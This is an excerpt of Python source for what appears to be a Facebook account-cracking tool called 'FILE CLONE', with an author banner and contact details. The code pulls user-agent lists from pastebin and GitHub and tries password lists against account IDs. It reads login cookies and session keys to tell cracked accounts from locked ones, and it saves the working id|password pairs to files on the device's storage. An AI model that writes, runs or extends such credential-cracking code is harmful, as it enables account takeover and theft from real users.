...
android_models=[]
try:
	xx = requests.get('https://pastebin.com/CMTzaHBD').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://pastebin.com/CMTzaHBD').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/M4M7N/SPIDER-PRO/blob/main/Request.txt').text
		ua=open('.bbnew.txt','w')
...
░      ░     ░   ▒   ░      ░    ░░░ ░ ░    ░   ░ ░ 
       ░         ░  ░       ░      ░              ░ 

  [] AUTHOR    \033[1;91m: \033[1;92mMAMUN ISLAM                 
  [] TOOL      \033[1;91m: \033[1;92mFILE CLONE                  
  [] STATUS    \033[1;91m: \033[1;92mFREE                       
  [] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                
  [] GITHUB    \033[1;91m: \033[1;92mMAMUN-404-CYBER            
  [] FACEBOOK  \033[1;91m: \033[1;92mMamun Islam                
  [] WHATSAPP  \033[1;91m: \033[1;92m+8801617046162             
 
'''
def linex():
	print('\033[1;32m----------------------------------------------')
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/MAMUN.txt \033[0;97m\n')
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://wa.me/+8801617046162');menu()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [MAMUN-OK] %s | %s'%(ids,pas))
				open('/sdcard/MAMUN-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [MAMUN-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/MAMUN-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [MAMUN-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/MAMUN-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [MAMUN-TL] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [MAMUN-OK] '+ids+' | '+pas)
